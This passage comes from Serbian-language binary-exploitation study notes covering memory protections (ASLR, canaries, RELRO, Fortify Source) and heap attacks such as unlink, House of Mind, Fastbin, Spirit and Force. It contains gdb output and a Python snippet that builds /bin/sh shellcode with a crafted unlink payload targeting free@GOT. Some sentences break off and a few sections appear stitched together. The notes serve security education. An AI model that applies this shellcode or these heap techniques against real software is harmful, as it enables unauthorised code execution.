Meƒëutim, prema onome ≈°to sam proƒçitao, ostali registri nisu za≈°tiƒáeni, **pa ako postoji `call ebx`, `call esi` ili `call edi`** unutar funkcije koja se poziva, mo≈æe se preuzeti kontrola. Ili takoƒëe mo≈æete izmeniti EBP da biste izmenili ESP.

**VTable i VPTR u C++**

Svaka klasa ima **Vtable** koji je niz **pokazivaƒça na metode**.

Svaki objekat klase ima **VPtr** koji je **pokazivaƒç** na niz svoje klase. VPtr je deo zaglavlja svakog objekta, pa ako se postigne **prepisivanje** VPtr-a, mo≈æe se **izmeniti** da **pokazuje** na la≈ænu metodu, tako da izvr≈°avanje funkcije ide na shell kod.

## **Preventivne mere i izbegavanje**

**ASLR nije tako sluƒçajan**

PaX deli prostor adresa procesa u 3 grupe:

Kod i inicijalizovani i neinicijalizovani podaci: .text, .data i .bss ‚Äî> 16 bita entropije u promenljivoj delta\_exec, ova promenljiva se inicijalizuje nasumiƒçno sa svakim procesom i dodaje se na poƒçetne adrese

Memorija dodeljena pomoƒáu mmap() i deljenih biblioteka ‚Äî> 16 bita, delta\_mmap

Stek ‚Äî> 24 bita, delta\_stack ‚Äî> Zaista 11 (od 10. do 20. bajta ukljuƒçujuƒái) ‚Äî> poravnato na 16 bajta ‚Äî> 524.288 moguƒáih stvarnih adresa steka

Okru≈æenjske promenljive i argumenti se pomeraju manje od bafera na steku.

**Return-into-printf**

To je tehnika koja pretvara preplavljivanje bafera u gre≈°ku formatiranja stringa. Sastoji se od zamene EIP-a tako da pokazuje na printf funkciju i prosleƒëivanja manipulisanog formatiranog stringa kao argumenta kako bi se dobile vrednosti o stanju procesa.

**Napad na biblioteke**

Biblioteke se nalaze na poziciji sa 16 bita nasumiƒçnosti = 65636 moguƒáih adresa. Ako ranjiv server pozove fork(), prostor adresa memorije se kopira u proces dete i ostaje netaknut. Zato se mo≈æe poku≈°ati izvr≈°iti brute force napad na usleep() funkciju iz libc, prosleƒëujuƒái joj argument "16", tako da kada du≈æe vreme traje da odgovori, ta funkcija je pronaƒëena. Znajuƒái gde se ta funkcija nalazi, mo≈æe se dobiti delta\_mmap i izraƒçunati ostale vrednosti.

Jedini naƒçin da budemo sigurni da ASLR funkcioni≈°e je kori≈°ƒáenje 64-bitne arhitekture. Tamo nema brute force napada.

**StackGuard i StackShield**

**StackGuard** ubacuje pre EIP-a ‚Äî> 0x000aff0d(null, \n, EndOfFile(EOF), \r) ‚Äî> I dalje su ranjive recv(), memcpy(), read(), bcoy() i ne ≈°titi EBP

**StackShield** je slo≈æeniji od StackGuard-a

Sve povratne adrese EIP se ƒçuvaju u tabeli (Global Return Stack) tako da preplavljivanje bafera ne prouzrokuje nikakvu ≈°tetu. Takoƒëe, obe adrese se mogu uporediti da se vidi da li je do≈°lo do preplavljivanja.

Takoƒëe se mo≈æe proveriti povratna adresa sa graniƒçnom vredno≈°ƒáu, pa ako EIP ode na drugo mesto, kao ≈°to je prostor podataka, znaƒáe se. Ali to se mo≈æe zaobiƒái sa Ret-to-lib, ROP ili ret2ret.

Kao ≈°to se mo≈æe videti, stackshield takoƒëe ne ≈°titi lokalne promenljive.

**Stack Smash Protector (ProPolice) -fstack-protector**

Canary se stavlja pre EBP-a. Lokalne promenljive se reorganizuju tako da baferi budu na najvi≈°im pozicijama i tako ne mogu prebrisati druge promenljive.

Takoƒëe, vr≈°i se sigurna kopija prosleƒëenih argumenata iznad steka (iznad lokalnih promenljivih) i koristi se ova kopija kao argumenti.

Ne mo≈æe za≈°tititi nizove sa manje od 8 elemenata ili baufere koji su deo korisniƒçke strukture.

Canary je sluƒçajan broj izvuƒçen iz "/dev/urandom" ili ako nije, onda je 0xff0a0000. ƒåuva se u TLS (Thread Local Storage). Niti dele isti prostor memorije, TLS je oblast koja ima globalne ili statiƒçke promenljive za svaku nit. Meƒëutim, u principu se kopiraju iz roditeljskog procesa, iako bi proces dete mogao da izmeni ove
### Relro

**Relro (Read only Relocation)** utiƒçe na dozvole memorije sliƒçno kao NX. Razlika je u tome ≈°to dok NX ƒçini stek izvr≈°ivim, RELRO ƒçini **odreƒëene stvari samo za ƒçitanje**, tako da im ne mo≈æemo pisati. Najƒçe≈°ƒái naƒçin na koji sam video da ovo predstavlja prepreku je spreƒçavanje **prepisivanja `got` tabele**, o ƒçemu ƒáe biti reƒçeno kasnije. `Got` tabela sadr≈æi adrese libc funkcija tako da binarni zna koje su adrese i mo≈æe ih pozvati. Hajde da vidimo kako izgledaju dozvole memorije za unos u `got` tabelu za binarnu datoteku sa i bez relro.

Sa relro:
```bash
gef‚û§  vmmap
Start              End                Offset             Perm Path
0x0000555555554000 0x0000555555555000 0x0000000000000000 r-- /tmp/tryc
0x0000555555555000 0x0000555555556000 0x0000000000001000 r-x /tmp/tryc
0x0000555555556000 0x0000555555557000 0x0000000000002000 r-- /tmp/tryc
0x0000555555557000 0x0000555555558000 0x0000000000002000 r-- /tmp/tryc
0x0000555555558000 0x0000555555559000 0x0000000000003000 rw- /tmp/tryc
0x0000555555559000 0x000055555557a000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gef‚û§  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gef‚û§  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/tryc'(0x555555557000-0x555555558000), permission=r--
0x555555557fd0 - 0x555555557fe8  ‚Üí   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
Bez relro:
```bash
gef‚û§  vmmap
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-- /tmp/try
0x0000000000401000 0x0000000000402000 0x0000000000001000 r-x /tmp/try
0x0000000000402000 0x0000000000403000 0x0000000000002000 r-- /tmp/try
0x0000000000403000 0x0000000000404000 0x0000000000002000 r-- /tmp/try
0x0000000000404000 0x0000000000405000 0x0000000000003000 rw- /tmp/try
0x0000000000405000 0x0000000000426000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gef‚û§  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gef‚û§  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/try'(0x404000-0x405000), permission=rw-
0x404018 - 0x404030  ‚Üí   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
Za binarni fajl **bez relro**-a, mo≈æemo videti da je adresa `got` unosa za `fgets` `0x404018`. Pogledajuƒái mapiranje memorije, vidimo da se nalazi izmeƒëu `0x404000` i `0x405000`, ≈°to ima **dozvole `rw`**, ≈°to znaƒçi da mo≈æemo ƒçitati i pisati u toj oblasti. Za binarni fajl **sa relro**-om, vidimo da je adresa tabele `got` za pokretanje binarnog fajla (pie je omoguƒáen, pa ƒáe se ova adresa promeniti) `0x555555557fd0`. U mapiranju memorije tog binarnog fajla se nalazi izmeƒëu `0x0000555555557000` i `0x0000555555558000`, ≈°to ima memoriju **dozvole `r`**, ≈°to znaƒçi da mo≈æemo samo ƒçitati iz nje.

Kako onda **zaobiƒái** ovo? Tipiƒçan naƒçin zaobila≈æenja koji koristim je da jednostavno ne pi≈°em u memorijske regione koje relro ƒçini samo za ƒçitanje, i **pronaƒëem drugi naƒçin za izvr≈°avanje koda**.

Napomena da bi ovo moglo da se desi, binarni fajl mora da zna unapred adrese funkcija:

* Lenje povezivanje: Adresa funkcije se tra≈æi prvi put kada se funkcija pozove. Dakle, `got` mora imati dozvole za pisanje tokom izvr≈°avanja.
* Pove≈æi odmah: Adrese funkcija se re≈°avaju na poƒçetku izvr≈°avanja, a zatim se dodeljuju dozvole samo za ƒçitanje osetljivim sekcijama kao ≈°to su .got, .dtors, .ctors, .dynamic, .jcr. `` `** ``-z relro`**`y`**`-z now\`\*\*

Da biste proverili da li program koristi Pove≈æi odmah, mo≈æete uraditi:
```bash
readelf -l /proc/ID_PROC/exe | grep BIND_NOW
```
Kada put kada se binarni fajl uƒçita u memoriju i funkcija se prvi put pozove, skoƒçi se na PLT (Procedure Linkage Table). Odatle se vr≈°i skok (jmp) na GOT i otkriva se da ta unosa nije re≈°ena (sadr≈æi sledeƒáu adresu iz PLT). Zatim se poziva Runtime Linker ili rtfd da re≈°i adresu i saƒçuva je u GOT.

Kada se pozove funkcija, poziva se PLT, koja ima adresu GOT gde se ƒçuva adresa funkcije, tako da preusmerava tok izvr≈°avanja tamo i poziva funkciju. Meƒëutim, ako je prvi put da se poziva funkcija, ono ≈°to se nalazi u GOT je sledeƒáa instrukcija iz PLT, pa tok izvr≈°avanja prati kod PLT (rtfd) i saznaje adresu funkcije, ƒçuva je u GOT i poziva.

Prilikom uƒçitavanja binarnog fajla u memoriju, kompajler mu je rekao na kojem offsetu treba da se nalaze podaci koji se moraju uƒçitati prilikom pokretanja programa.

Lenje vezivanje (Lazy binding) - Adresa funkcije se tra≈æi prvi put kada se ta funkcija pozove, tako da GOT ima dozvolu za pisanje kako bi se adresa saƒçuvala tamo i ne bi je trebalo ponovo tra≈æiti.

Ve≈æi odmah (Bind now) - Adrese funkcija se tra≈æe prilikom uƒçitavanja programa i menja se dozvola sekcija .got, .dtors, .ctors, .dynamic, .jcr na samo ƒçitanje. **-z relro** i **-z now**

Meƒëutim, opƒáenito gledano, programi nisu komplicirani s tim opcijama, pa su ovi napadi i dalje moguƒái.

**readelf -l /proc/ID_PROC/exe | grep BIND_NOW** - Da biste saznali da li koriste BIND NOW

**Fortify Source -D_FORTIFY_SOURCE=1 ili =2**

Poku≈°ava identifikovati funkcije koje nebezbedno kopiraju podatke sa jednog mesta na drugo i menja funkciju sa bezbednom funkcijom.

Na primer:\
char buf[16];\
strcpy(buf, source);

Identifikuje je kao nebezbednu i zatim menja strcpy() sa \_\_strcpy\_chk() koristeƒái veliƒçinu bafera kao maksimalnu veliƒçinu za kopiranje.

Razlika izmeƒëu **=1** i **=2** je da:

Druga ne dozvoljava da **%n** dolazi iz sekcije sa dozvolom za pisanje. Takoƒëe, parametar za direktan pristup argumentima mo≈æe se koristiti samo ako su prethodno kori≈°ƒáeni, tj. mo≈æe se koristiti samo **%3$d** ako je prethodno kori≈°ƒáeno **%2$d** i **%1$d**

Za prikazivanje poruke o gre≈°ci koristi se argv\[0\], pa ako se u njega stavi adresa druge lokacije (kao globalna promenljiva), poruka o gre≈°ci ƒáe prikazati sadr≈æaj te promenljive. Str. 191

**Zamena Libsafe**

Aktivira se sa: LD\_PRELOAD=/lib/libsafe.so.2\
ili\
‚Äú/lib/libsave.so.2‚Äù > /etc/ld.so.preload

Pozivi nekih nebezbednih funkcija se presreƒáu i zamenjuju bezbednim funkcijama. Nije standardizovano. (samo za x86, ne za kompilacije sa -fomit-frame-pointer, ne za statiƒçke kompilacije, ne sve ranjive funkcije postaju bezbedne i LD\_PRELOAD ne radi za binarne fajlove sa suid).

**ASCII Armored Address Space**

Sastoji se od uƒçitavanja deljenih biblioteka od 0x00000000 do 0x00ffffff kako bi uvek postojao bajt 0x00. Meƒëutim, ovo zapravo ne zaustavlja gotovo nijedan napad, a posebno ne u little endian formatu.

**ret2plt**

Sastoji se od izvoƒëenja ROP-a tako da se pozove funkcija strcpy@plt (iz plt-a) i usmeri se na unos u GOT-u i kopira se prvi bajt funkcije koju ≈æelimo pozvati (system()). Zatim se isto radi usmeravajuƒái se na GOT+1 i kopira se drugi bajt system()... Na kraju se poziva adresa koja je saƒçuvana u GOT-u, a to ƒáe biti system().

**La≈æni EBP**

Za funkcije koje koriste EBP kao registar za pokazivaƒç na argumente, prilikom izmene EIP-a i usmeravanja na system(), takoƒëe treba izmeniti i EBP kako bi pokazivao na memorijsko podruƒçje koje ima bilo koja 2 bajta, a zatim na adresu &"/bin/sh".

**Kavezi sa chroot()**

debootstrap -arch=i386 hardy /home/user - Instalira osnovni sistem u odreƒëeni poddirektorijum

Administrator mo≈æe izaƒái iz ovih kaveza tako ≈°to napravi: mkdir foo; chroot foo; cd ..

**Instrumentacija koda**

Valgrind - Tra≈æi gre≈°ke\
Memcheck\
RAD (Return Address Defender)\
Insure++

## **8 Heap Overflow: Osnovni eksploiti**

**Dodeljeni deo**

prev\_size |\
size | - Zaglavlje\
\*mem | Podaci

**Slobodan deo**

prev\_size |\
size |\
\*fd | Ptr naprednog bloka\
\*bk | Ptr nazadnog bloka - Zaglavlje\
\*mem | Podaci

Slobodni delovi su u dvostruko povezanoj listi (bin) i nikada ne smeju postojati dva slobodna dela zajedno (spajaju se).

U "size" se nalaze bitovi koji oznaƒçavaju: da li je prethodni deo u upotrebi, da li je deo dodeljen putem mmap() i da li deo pripada primarnoj areni.

Ako se oslobodi deo i neki od susednih delova je slobodan, oni se spajaju pomoƒáu makroa unlink() i novi, veƒái deo se prosleƒëuje frontlink() da ga ubaci u odgovarajuƒái bin.

unlink(){\
BK = P->bk; - BK novog bloka je onaj koji je imao prethodno slobodan blok\
FD = P->fd; - FD novog bloka je onaj koji je imao prethodno slobodan blok\
FD->bk = BK; - BK sledeƒáeg bloka pokazuje na novi blok\
BK->fd = FD; - FD prethodnog bloka pokazuje na novi blok\
}

Dakle, ako uspemo da izmenimo P->bk sa adresom shell koda i P->fd sa adresom unosa u GOT ili DTORS minus 12, posti≈æe se:

BK = P->bk = \&shellcode\
FD = P->fd = &\_\_dtor\_end\_\_ - 12\
FD->bk = BK -> \*((&\_\_dtor\_end\_\_ - 12) + 12) = \&shellcode

I tako se prilikom izlaska iz programa izvr≈°ava shell kod.

Osim toga, ƒçetvrta naredba unlink() pi≈°e ne≈°to i shell kod mora biti prilagoƒëen za to:

BK->fd = FD -> \*(\&shellcode + 8) = (&\_\_dtor\_end\_\_ - 12) - Ovo dovodi do pisanja 4 bajta poƒçev≈°i od 8. bajta shell koda, pa prva instrukcija shell koda mora bit
**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<I‚Äù, 0xfffffff0) #Interesa que el bit que indica que el anterior trozo est√° libre est√© a 1**

**fake\_size = pack("\<I‚Äù, 0xfffffffc) #-4, para que piense que el ‚Äúsize‚Äù del 3¬∫ trozo est√° 4bytes detr√°s (apunta a prev\_size) pues es ah√≠ donde mira si el 2¬∫ trozo est√° libre**

**addr\_sc = pack("\<I", 0x0804a008 + 8) #En el payload al principio le vamos a poner 8bytes de relleno**

**got\_free = pack("\<I", 0x08048300 - 12) #Direcci√≥n de free() en la plt-12 (ser√° la direcci√≥n que se sobrescrita para que se lanza la shellcode la 2¬∫ vez que se llame a free)**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) # Como se dijo el payload comienza con 8 bytes de relleno porque s√≠**

**payload += prev\_size + fake\_size + got\_free + addr\_sc #Se modifica el 2¬∫ trozo, el got\_free apunta a donde vamos a guardar la direccion addr\_sc + 12**

**os.system("./8.3.o " + payload)**

**unset() liberando en sentido inverso (wargame)**

Kontroli≈°emo 3 uzastopna chunk-a i oni se oslobaƒëaju u obrnutom redosledu od rezervisanog.

U ovom sluƒçaju:

U chunk-u c se sme≈°ta shellcode

Chunk a koristimo da prepi≈°emo b tako da size ima iskljuƒçen bit PREV_INUSE tako da misli da je chunk a slobodan.

Takoƒëe, u zaglavlju b se prepi≈°e size tako da bude -4.

Zatim, program ƒáe misliti da je "a" slobodan i u binu, pa ƒáe pozvati unlink() da ga odve≈æe. Meƒëutim, po≈°to PREV_SIZE u zaglavlju ima vrednost -4, pomisliƒáe da chunk "a" zapravo poƒçinje na b+4. Drugim reƒçima, pozvaƒáe unlink() na chunk koji poƒçinje na b+4, pa ƒáe u b+12 biti pokazivaƒç "fd", a u b+16 ƒáe biti pokazivaƒç "bk".

Na ovaj naƒçin, ako u bk stavimo adresu shellcode, a u fd stavimo adresu funkcije "puts()"-12, imamo na≈° payload.

**Tehnika Frontlink**

Frontlink se poziva kada se ne≈°to oslobaƒëa, a nijedan od susednih chunk-ova nije slobodan. Tada se ne poziva unlink(), veƒá se direktno poziva frontlink().

Korisna ranjivost kada malloc koji se napada nikada nije osloboƒëen (free()).

Potrebno je:

Bafer koji mo≈æe biti preplavljen unosom podataka

Susedni bafer koji treba osloboditi i ƒçije ƒáe se polje fd u zaglavlju izmeniti zbog preplavljivanja prethodnog bafera

Bafer koji treba osloboditi sa veliƒçinom veƒáom od 512, ali manjom od prethodnog bafera

Bafer koji je deklarisan pre koraka 3 i koji omoguƒáava prepisivanje prev_size-a

Na ovaj naƒçin, preplavljujuƒái dva malloc-a na nekontrolisan naƒçin i jedan na kontrolisan naƒçin koji se samo oslobaƒëa, mo≈æemo izvr≈°iti exploit.

**Ranjivost double free()**

Ako se dva puta pozove free() sa istim pokazivaƒçem, imaƒáemo dva bin-a koji pokazuju na istu adresu.

Ako ≈æelimo ponovo koristiti jedan, to ƒáe se desiti bez problema. Ako ≈æelimo koristiti drugi, dodeliƒáe mu se isti prostor, pa ƒáemo imati la≈æirane pokazivaƒçe "fd" i "bk" sa podacima koje ƒáe upisati prethodna rezervacija.

**After free()**

Prethodno osloboƒëeni pokazivaƒç se ponovo koristi bez kontrole.

## **8 Heap preplavljivanje: Napredni exploit-i**

Tehnike Unlink() i FrontLink() su uklonjene izmenom funkcije unlink().

**The house of mind**

Potrebno je samo jedno osloboƒëenje (free()) da bi se izvr≈°io proizvoljni kod. Potrebno je pronaƒái drugi chunk koji mo≈æe biti preplavljen prethodnim i osloboƒëen.

Poziv free() dovodi do poziva public\_fREe(mem), koji radi sledeƒáe:

mstate ar\_ptr;

mchunkptr p;

‚Ä¶

p = mem2chunk(mes); ‚Äî> Vraƒáa pokazivaƒç na adresu na kojoj chunk poƒçinje (mem-8)

‚Ä¶

ar\_ptr = arena\_for\_chunk(p); ‚Äî> chunk\_non\_main\_arena(ptr)?heap\_for\_ptr(ptr)->ar\_ptr:\&main\_arena \[1]

‚Ä¶

\_int\_free(ar\_ptr, mem);

}

U \[1] se proverava polje size bit NON\_MAIN\_ARENA, koje se mo≈æe promeniti da bi provera vratila true i izvr≈°ila se funkcija heap\_for\_ptr(), koja vr≈°i AND operaciju nad "mem" i postavlja na 0 najmanje znaƒçajna 2.5 bajta (u na≈°em sluƒçaju od 0x0804a000 postaje 0x08000000) i pristupa 0x08000000->ar\_ptr (kao da je struktura heap\_info)

Na ovaj naƒçin, ako mo≈æemo kontrolisati chunk na primer na 0x0804a000 i treba osloboditi chunk na **0x081002a0**, mo≈æemo doƒái do adrese 0x08100000 i upisati ≈°ta god ≈æelimo, na primer **0x0804a000**. Kada se ovaj drugi chunk oslobodi, naƒái ƒáe da heap\_for\_ptr(ptr)->ar\_ptr vraƒáa ono ≈°to smo upisali na 0x08100000 (jer se primenjuje AND na 0x081002a0, ≈°to smo videli ranije, i iz te vrednosti se uzima vrednost prvih 4 bajta, ar\_ptr)

Na ovaj naƒçin se poziva \_int\_free(ar\_ptr, mem), odnosno **\_int\_free(0x0804a000, 0x081002a0)**\
**\_int\_free(mstate av, Void\_t\* mem){**\
‚Ä¶\
bck = unsorted\_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

Kao ≈°to smo videli ranije, mo≈æemo kontrolisati vrednost av, jer je to ono ≈°to pi≈°emo u chunk koji ƒáe biti osloboƒëen.

Kako je unsorted\_chunks definisan, znamo da:\
bck = \&av->bins\[2]-8;\
fwd = bck->fd = \*(av->bins\[2]);\
fwd->bk = \*(av->bins\[2] + 12) = p;

Dakle, ako u av->bins\[2] upi≈°emo vrednost \_\_DTOR\_END\_\_-12, u poslednjoj instrukciji ƒáe se upisati u \_\_DTOR\_END\_\_ adresa drugog chunk-a.

Drugim reƒçima, u prvom chunk-u moramo na poƒçetak staviti adres
Ova tehnika vi≈°e nije primenjiva jer je gotovo isti zakrpa primenjen kao i za unlink. Uporeƒëuju se da li nova lokacija na koju se pokazuje takoƒëe pokazuje na njega.

**Fastbin**

To je varijanta The house of mind

interesuje nas da izvr≈°imo sledeƒái kod koji se izvr≈°ava nakon prvog provere funkcije \_int\_free()

fb = &(av->fastbins\[fastbin\_index(size)] ‚Äî> Gde je fastbin\_index(sz) ‚Äî> (sz >> 3) - 2

‚Ä¶

p->fd = \*fb

\*fb = p

Na ovaj naƒçin, ako se postavi u "fb", daje adresu funkcije u GOT, na ovu adresu ƒáe se postaviti adresa prebrisane sekcije. Za ovo ƒáe biti potrebno da arena bude blizu adresa dtors. Taƒçnije, av->max\_fast treba da bude na adresi koju ≈æelimo da prepi≈°emo.

S obzirom da smo sa The House of Mind videli da mi kontroli≈°emo poziciju av.

Zato, ako u polje size stavimo veliƒçinu od 8 + NON\_MAIN\_ARENA + PREV\_INUSE ‚Äî> fastbin\_index() ƒáe nam vratiti fastbins\[-1\], koji ƒáe pokazivati na av->max\_fast

U ovom sluƒçaju, av->max\_fast ƒáe biti adresa koja ƒáe biti prebrisana (ne na koju pokazuje, veƒá ta pozicija ƒáe biti prebrisana).

Takoƒëe, mora se ispuniti uslov da susedni segment osloboƒëenog segmenta bude veƒái od 8 -> Po≈°to smo rekli da je veliƒçina osloboƒëenog segmenta 8, u ovom la≈ænom segmentu samo trebamo staviti veliƒçinu veƒáu od 8 (po≈°to ƒáe shellcode biti u osloboƒëenom segmentu, treba staviti na poƒçetak jmp koji ƒáe pasti na nops).

Takoƒëe, isti la≈æni segment mora biti manji od av->system\_mem. av->system\_mem se nalazi 1848 bajtova dalje.

Zbog nula iz \_DTOR\_END\_ i malog broja adresa u GOT, nijedna adresa iz ovih sekcija ne mo≈æe biti prebrisana, pa hajde da vidimo kako primeniti fastbin za napad na stek.

Jo≈° jedan naƒçin napada je preusmeravanje **av** na stek.

Ako promenimo veliƒçinu na 16 umesto 8, tada: fastbin\_index() ƒáe nam vratiti fastbins\[0\] i to mo≈æemo iskoristiti da prepi≈°emo stek.

Za ovo ne sme biti nikakvih canary vrednosti ili ƒçudnih vrednosti na steku, zapravo moramo biti u ovom rasporedu: 4 nula bajta + EBP + RET

Potrebna su nam 4 nula bajta kako bi **av** bio na toj adresi i prvi element **av** je mutex koji mora biti 0.

**av->max\_fast** ƒáe biti EBP i biƒáe vrednost koja ƒáe nam omoguƒáiti da zaobiƒëemo ograniƒçenja.

U **av->fastbins\[0\]** ƒáe biti prebrisana adresa **p** i biƒáe RET, tako da ƒáe se preskoƒçiti na shellcode.

Takoƒëe, u **av->system\_mem** (1484 bajta iznad pozicije na steku) ƒáe biti dovoljno smeƒáa koje ƒáe nam omoguƒáiti da zaobiƒëemo proveru koja se vr≈°i.

Takoƒëe, mora se ispuniti uslov da susedni segment osloboƒëenog segmenta bude veƒái od 8 -> Po≈°to smo rekli da je veliƒçina osloboƒëenog segmenta 16, u ovom la≈ænom segmentu samo trebamo staviti veliƒçinu veƒáu od 8 (po≈°to ƒáe shellcode biti u osloboƒëenom segmentu, treba staviti na poƒçetak jmp koji ƒáe pasti na nops koji dolaze nakon polja size novog la≈ænog segmenta).

**The House of Spirit**

U ovom sluƒçaju tra≈æimo da imamo pokazivaƒç na malloc koji mo≈æe biti promenjen od strane napadaƒça (na primer, da je pokazivaƒç na steku ispod moguƒáeg prelivanja promenljive).

Na taj naƒçin, mogli bismo da navedemo da ovaj pokazivaƒç pokazuje gde god ≈æelimo. Meƒëutim, ne svako mesto je validno, veliƒçina la≈ænog segmenta mora biti manja od av->max\_fast i taƒçnije jednaka veliƒçini koja ƒáe biti tra≈æena u buduƒáem pozivu malloc()+8. Zato, ako znamo da se nakon ovog ranjivog pokazivaƒça poziva malloc(40), veliƒçina la≈ænog segmenta mora biti jednaka 48.

Na primer, ako program pita korisnika za broj, mo≈æemo uneti 48 i uputiti promenljivi pokazivaƒç malloc na sledeƒáih 4 bajta (koji mogu pripadati EBP-u sa sreƒáom, tako da 48 ostaje iza, kao da je veliƒçina zaglavlja). Takoƒëe, adresa ptr-4+48 mora zadovoljiti nekoliko uslova (u ovom sluƒçaju ptr=EBP), to jest, 8 < ptr-4+48 < av->system\_mem.

Ako se ovo ispuni, kada se pozove sledeƒái malloc koji smo rekli da je malloc(40), dodeliƒáe mu se adresa adresa EBP-a. Ako napadaƒç takoƒëe mo≈æe kontrolisati ≈°ta se pi≈°e u ovom mallocu, mo≈æe prebrisati i EBP i EIP sa ≈æeljenom adresom.

Mislim da je to zato ≈°to ƒáe kada se oslobodi free() zabele≈æiti da u adresi koja pokazuje na EBP steka postoji segment savr≈°ene veliƒçine za novi malloc() koji se ≈æeli rezervisati, pa mu dodeljuje tu adresu.

**The House of Force**

Potrebno je:

* Preplavljivanje segmenta koje omoguƒáava prebrisavanje wildernessa
* Poziv malloc() sa veliƒçinom definisanom od strane korisnika
* Poziv malloc() ƒçiji podaci mogu biti definisani od strane korisnika

Prvo ≈°to se radi je prebrisavanje veliƒçine segmenta wilderness sa vrlo velikom vredno≈°ƒáu (0xffffffff), tako da ƒáe svaki zahtev za memorijom koji je dovoljno velik biti obraƒëen u \_int\_malloc() bez potrebe za pro≈°irivanjem heap-a.

Drugo je izmena av->top tako da pokazuje na deo memorije pod kontrolom napadaƒça, kao ≈°to je stek. U av->top se postavlja \&EIP - 8.

Mora se prebrisati av->top tako da pokazuje na deo memorije pod kontrolom napadaƒça:

victim = av->top;

remainder = chunck\_at\_offset(victim, nb);

av->top = remainder;

Victim uzima vrednost adrese trenutnog segmenta wilderness (trenutni av->top) i remainder je taƒçno zbir te adrese plus broj bajtova koji su tra≈æeni od strane malloc(). Dakle, ako je \&EIP-8 na adresi 0xbffff224 i av->top sadr≈æi 0x080c2788, tada je koliƒçina koju moramo rezervisati u kontrolisanom mallocu kako bi av->top pokazivao na $EIP-8 za sledeƒái malloc():

0xbffff224 - 0x080c2788 = 3086207644.

Na taj naƒçin se ƒçuva promenjena vrednost u av->top i sledeƒái malloc ƒáe pokazivati na EIP i moƒái
## Heap eksploatacija - osnovni ESP

### Overflow sa dva malloc-a

